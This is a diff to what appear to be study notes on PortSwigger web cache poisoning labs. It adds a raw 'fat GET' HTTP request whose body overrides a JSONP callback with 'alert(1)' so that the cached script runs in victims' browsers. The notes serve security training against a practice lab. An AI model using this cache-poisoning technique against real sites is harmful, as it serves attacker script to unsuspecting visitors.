@@ -208,6 +208,26 @@ arbitraryFunction({"country" : "United Kingdom"})
 3. Send the request again, but this time pass in ``alert(1)`` as the callback function. Check that you can successfully poison the cache.
 4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.
 
+FAT GET:
+
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0a9c00f10383918d80a9e92d009800c5.web-security-academy.net
+Cookie: country=[object Object]; session=N3Fa4xODwv3Jb9RwYoJbW2UnYAAHykrb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=1
+Te: trailers
+Content-Length: 17
+
+callback=alert(1)
+
 ## URL normalization
 Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization
 
